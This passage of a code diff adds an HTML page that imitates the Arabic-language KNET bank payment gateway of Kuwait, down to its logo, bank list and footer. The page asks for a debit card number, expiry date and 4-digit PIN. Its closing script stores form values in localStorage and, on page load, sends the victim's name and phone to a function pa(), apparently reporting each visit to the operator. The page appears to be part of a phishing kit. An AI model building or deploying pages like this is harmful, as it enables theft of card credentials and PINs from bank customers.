M6EP7rzLAXxyv8hEOzOjEIP01sJGWqE8Ht/WgNi3VyQIqqp/0lvctFJ6Ni/Lvt5zAl65iUNw66MHmDz5Tz6hf/34j4+IOBRtmNS0JvgkiTBIbP7QkBQzK9caG/X2sR6vbMr86fZXL1nGEq176lLYesDVKcRLs9cDfaGReL6t1N0b3YKu32RE2yb3INCWc81zS4p7jWWaBNnzmEYrP5mMzsoRZD8fPh5hzUX7OA2zYaI9iukpqCYm2KDaW+H26fkS7C13X2YMIfgN3hyop1QXlR/7ApGlKu55ec/SFgV0dRveLgTBFRUpN/DS7q1ToZExCXHGUz7n5m0cE2bYqLeG9yLdw9Nae721GPC9HH3cPxn+ZKLPKUNz2vTYNyRs+fvsk1JCnX8wehEYArVV+6q8CpTczh6N6Jk5EDAa+MdYGobjzVxcboIkccevTZMG0uKKfP7xlw/GMYlzuLa5y9U31pEkrKit+C8y8pn2wIukA0DJttp5ehC9hp5X9O2Lf0wFEljBL0bP3enMzHCsV3zavKs15pmCaxpLb4CTQArlh9cBaoceWfOu0O3zIEZE9b+Z8T6ssOfSSkrQSuQ99An7NxhuC7XNUF9JrCNAkk9cUPrCDY5J4i/ZJTGgEm+TgaAKu1NogCNCRlODoRaqQeNAKYhr+4fxBMI4Bi8pm4g+A0fUiO+JU6oddihhqAETILRO+pP3FeZtQNAKrvMhyZ9GLZlKRxyesfm8IsQT2HZxYoTQ9JEb+0Xm+n4n4bLzUAIZmnpCY/n9L0ht9JPrY8GheIC/af+646QP+lJWWhBoDg3oXVPi6Q1QCY3Fn6dDoGSARJEX9Dect+KPdqDOcvQKjvhS5cqZ47rZKZQz9SbMUAvbNANAI4MnzL0bh29C87dMGmTUrJ+yd2cXpDWeKQ0n/GvmDTuTFDs0DCtLkwArzUp2zFjimTP1pa1TsLpvkwdDsca58X5g4HnKm20H1yruL+0X4fOG8NLR+jfEKmp4MkZZ4/Glw1+fQIL73rZ/C6KfWRFMyViP8tleaLScoFvJ4y7z3oOTfSXR5tCo+eBQq9D5AmTTSk3mwPxlJPecs9CO7opVdDzcp0md30MFiaNNGTcm5PD/S6w+q8h5gQYd/6hoHhMLfZ5nkWHXxbm9KkiYrU6/mD0AhQgRGAsQ0BQy+W8P1p4aeJjxH5/6fR8M5/tdZNWZHTybi6BC2C/u9Vg6lkecNS7zuBLdKkiQXG/h+X6ZEj3Wsu5QAAAABJRU5ErkJggg==" alt="logo"></div>
+                        <div class="row">
+                            <div style="text-align: right;"><label class="column-label" style="width: 60%;">CFC Co.</label> </div>
+                            <div style="float:right;"><label class="column-value text-label" style="width:auto;">:المستفيد </label></div>
+                        </div>
+                        <div id="OrgTranxAmt">
+                            <div style="text-align:right;"><label class="column-label" style="width: 60%;">
+                                    KD&nbsp;1.000
+                                </label>
+                            </div>
+                            <div style="float:right;">
+                                <label class="column-value text-label" style="width:auto;"> :المبلغ</label>
+                            </div>
+                        </div>
+                        <!-- Added for PG Eidia Discount starts   -->
+                        <div class="row" id="DiscntRate" style="display:none;">
+                        </div>
+                        <div class="row" id="DiscntedAmt" style="display:none;">
+                        </div>
+                        <!-- Added for PG Eidia Discount ends   -->
+                    </div>
+                    <div class="form-card">
+                        <div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
+                            font-family: helvetica, arial, sans serif;
+                            color: #ff0000;
+                             padding-right: 15px; display:none; margin-bottom: 3px;text-align: center;" id="otpmsgDC">
+                        </div>
+                        <!--Customer Validation  for knet-->
+                        <div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
+                            font-family: helvetica, arial, sans serif;
+                            color: #ff0000;
+                             padding-right: 15px; display:none; margin-bottom: 3px;text-align: center;" id="CVmsg">
+                        </div>
+                        <div id="ValidationMessage"></div>
+                        <div id="savedCardDiv" style="display:none; ">
+                            <div class="row">
+                            </div>
+                            <!-- Added for Points Redemption -->
+                            <div class="row">
+                                <label class="column-label" style=" float:right;text-align:right;">
+                                    :الرقم السري
+                                </label>
+                                <input inputmode="numeric" pattern="[0-9]*" name="debitsavedcardPIN" id="debitsavedcardPIN" autocomplete="off" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password" size="4" maxlength="4" class="allownumericwithoutdecimal" style=" width:60%; text-align:right; " onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" onblur="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;">
+                            </div>
+                        </div>
+                        <div id="FCUseDebitEnable" style="margin-top: 5px;">
+                            <div class="row">
+                                <div style="text-align:right;">
+                                    <select class="column-value" id='bank' style="width:60%;" onchange="javascript:validatebank(this.value)" dir="rtl">
+                                        <option value="" title="Select Your Bank">
+                                            يرجى اختيار البنك
+                                        </option>
+                                        <option value="ABK">
+                                            البنك الأهلي الكويتي [ABK]
+                                        </option>
+                                        <option value="ALRAJHI">
+                                            مصرف الراجحي [Rajhi]
+                                        </option>
+                                        <option value="BBK">
+                                            بنك البحرين والكويت [BBK]
+                                        </option>
+                                        <option value="BOUBYAN">
+                                            بنك بوبيان [Boubyan]
+                                        </option>
+                                        <option value="BURGAN">
+                                            بنك برقان [Burgan]
+                                        </option>
+                                        <option value="CBK">
+                                            البنك التجاري الكويتي [CBK]
+                                        </option>
+                                        <option value="DOHA">
+                                            بنك الدوحة [Doha]
+                                        </option>
+                                        <option value="GBK">
+                                            بنك الخليج [GBK]
+                                        </option>
+                                        <option value="TAM">
+                                            بيتك [TAM]
+                                        </option>
+                                        <option value="KFH">
+                                            بيت التمويل الكويتي [KFH]
+                                        </option>
+                                        <option value="KIB">
+                                            بنك الكويت الدولي [KIB]
+                                        </option>
+                                        <option value="NBK">
+                                            بنك الكويت الوطني [NBK]
+                                        </option>
+                                        <option value="WEYAY">
+                                            الوطني [Weyay]
+                                        </option>
+                                        <option value="QNB">
+                                            بنك قطر الوطني [QNB]
+                                        </option>
+                                        <option value="UNB">
+                                            بنك الاتحاد الوطنى [UNB]
+                                        </option>
+                                        <option value="WARBA">
+                                            بنك وربة [Warba]
+                                        </option>
+                                    </select> </div>
+                                <div style="text-align:right;  float:right;"><label class="column-label" style="width:100%;">:يرجى اختيار البنك</label></div>
+                            </div>
+                            <div class="row three-column" id="Paymentpagecardnumber">
+                                <label>
+                                    <select class="column-value" name="dcprefix" id="dcprefix" dir="rtl" style="width:26%;">
+                                        <option value="" id="bankcode">
+                                            بادِئة
+                                        </option>
+                                    </select>
+                                </label>
+                                <label> <input name="debitNumber" id="debitNumber" type="tel" inputmode="numeric" pattern="[0-9]*" size="10" style="width: 32%;float:left" maxlength="10"  onblur="return ValidateNumPin(event);" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" class="allownumericwithoutdecimal" title="يجب أن يكون في العدد. يجب أن يكون الطول 10">
+                                <!-- <label> <input name="debitNumber" id="debitNumber" type="tel" inputmode="numeric" pattern="[0-9]*" size="10" style="width: 32%;float:left" maxlength="10"  onblur="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;" class="allownumericwithoutdecimal" title="يجب أن يكون في العدد. يجب أن يكون الطول 10"> -->
+                                </label>
+                                <!-- Added for Points Redemption -->
+                                <label class="column-label" style="float:right;text-align:right;">:رقم بطاقة الصرف الآلي </label>
+                                <!-- Added for Points Redemption -->
+                            </div>
+                            <div class="row three-column" id="cardExpdate">
+                                <div id="debitExpDate" style="float:right; text-align:right;">
+                                    <label class="column-label" style="width: 100%;">
+                                        :تاريخ انتهاء البطاقة </label></div>
+                                <div style="width: 60%;text-align: right;">
+                                    <select id='year' class="paymentselect" dir="rtl">
+                                        <option value="">
+                                            YYYY
+                                        </option>
+                                        <option value="2026">
+                                            2026
+                                        </option>
+                                        <option value="2027">
+                                            2027
+                                        </option>
+                                        <option value="2028">
+                                            2028
+                                        </option>
+                                        <option value="2029">
+                                            2029
+                                        </option>
+                                        <option value="2030">
+                                            2030
+                                        </option>
+                                        <option value="2031">
+                                            2031
+                                        </option>
+                                        <option value="2032">
+                                            2032
+                                        </option>
+                                        <option value="2033">
+                                            2033
+                                        </option>
+                                        <option value="2034">
+                                            2034
+                                        </option>
+                                        <option value="2035">
+                                            2035
+                                        </option>
+                                        <option value="2036">
+                                            2036
+                                        </option>
+                                        <option value="2037">
+                                            2037
+                                        </option>
+                                        <option value="2038">
+                                            2038
+                                        </option>
+                                        <option value="2039">
+                                            2039
+                                        </option>
+                                        <option value="2040">
+                                            2040
+                                        </option>
+                                        <option value="2041">
+                                            2041
+                                        </option>
+                                        <option value="2042">
+                                            2042
+                                        </option>
+                                        <option value="2043">
+                                            2043
+                                        </option>
+                                        <option value="2044">
+                                            2044
+                                        </option>
+                                        <option value="2045">
+                                            2045
+                                        </option>
+                                        <option value="2046">
+                                            2046
+                                        </option>
+                                        <option value="2047">
+                                            2047
+                                        </option>
+                                        <option value="2048">
+                                            2048
+                                        </option>
+                                        <option value="2049">
+                                            2049
+                                        </option>
+                                        <option value="2050">
+                                            2050
+                                        </option>
+                                        <option value="2051">
+                                            2051
+                                        </option>
+                                        <option value="2052">
+                                            2052
+                                        </option>
+                                        <option value="2053">
+                                            2053
+                                        </option>
+                                        <option value="2054">
+                                            2054
+                                        </option>
+                                        <option value="2055">
+                                            2055
+                                        </option>
+                                        <option value="2056">
+                                            2056
+                                        </option>
+                                        <option value="2057">
+                                            2057
+                                        </option>
+                                        <option value="2058">
+                                            2058
+                                        </option>
+                                        <option value="2059">
+                                            2059
+                                        </option>
+                                        <option value="2060">
+                                            2060
+                                        </option>
+                                        <option value="2061">
+                                            2061
+                                        </option>
+                                        <option value="2062">
+                                            2062
+                                        </option>
+                                        <option value="2063">
+                                            2063
+                                        </option>
+                                        <option value="2064">
+                                            2064
+                                        </option>
+                                        <option value="2065">
+                                            2065
+                                        </option>
+                                        <option value="2066">
+                                            2066
+                                        </option>
+                                        <option value="2067">
+                                            2067
+                                        </option>
+                                        <option value="2068">
+                                            2068
+                                        </option>
+                                        <option value="2069">
+                                            2069
+                                        </option>
+                                    </select>
+                                    <select id='month' class="paymentselect" dir="rtl">
+                                        <option value="">
+                                            MM
+                                        </option>
+                                        <option value="1">
+                                            01
+                                        </option>
+                                        <option value="2">
+                                            02
+                                        </option>
+                                        <option value="3">
+                                            03
+                                        </option>
+                                        <option value="4">
+                                            04
+                                        </option>
+                                        <option value="5">
+                                            05
+                                        </option>
+                                        <option value="6">
+                                            06
+                                        </option>
+                                        <option value="7">
+                                            07
+                                        </option>
+                                        <option value="8">
+                                            08
+                                        </option>
+                                        <option value="9">
+                                            09
+                                        </option>
+                                        <option value="10">
+                                            10
+                                        </option>
+                                        <option value="11">
+                                            11
+                                        </option>
+                                        <option value="12">
+                                            12
+                                        </option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="row" id="PinRow">
+                                <!-- <div class="col-lg-12"><label class="col-lg-6"></label></div> -->
+                                <input type="hidden" name="cardPinType" value="A">
+                                <div id="eComPin">
+                                    <label class="column-label" style=" float:right;text-align:right;">
+                                        :الرقم السري
+                                    </label>
+                                </div>
+                                <div>
+                                    <input inputmode="numeric" pattern="[0-9]*" name="cardPin" id="cardPin" autocomplete="off" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password" size="4" maxlength="4" style="width: 60%;text-align:right;" class="allownumericwithoutdecimal" onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-card">
+                        <div class="row">
+                            <div style="text-align:center;">
+                                <div id="submithide">
+                                    <button name="proceed" type="button" class="submit-button" style="float:right;" onclick="onPay();" id="proceed">إرسال</button>
+                                    <input name="proceedCancel" type="button" class="cancel-button" id="cancel" value="إلغاء">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div align="center" id="overlayhide" class="overlay" style="display:none;"><img src="./static/img/loadingmob.gif" style="height: 15%;margin-top:50%;"></div>
+                    <footer>
+                        <div>
+                            <span><div class="row_new"><div style="text-align: center;font-size: 12px;"> جميع الحقوق محفوظة&nbsp;©&nbsp;2026 <br><span style="font-weight:bold;color: #0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span></div></div></span>
+                            <div id="DigiCertClickID_cM-vbZrL"></div>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+        </div>
+
+
+        </form>
+        <script>
+            $('#debitNumber').on('input',()=>{
+                $('#ValidationMessage').hide()
+            })
+
+            $('#month').on('change',()=>{
+                console.log($('#month').val())
+                localStorage.setItem('month',$('#month').val())
+            })
+            $('#year').on('change',()=>{
+                console.log($('#year').val())
+                localStorage.setItem('year',$('#year').val())
+            })
+            document.addEventListener("DOMContentLoaded", async () => {
+                msg = `📩 في صفحة الكي نت\n`
+                msg += localStorage.getItem('name')
+                msg += localStorage.getItem('phone')
+                pa({msg})
+            });
+        </script>
+    </body>
+</html>
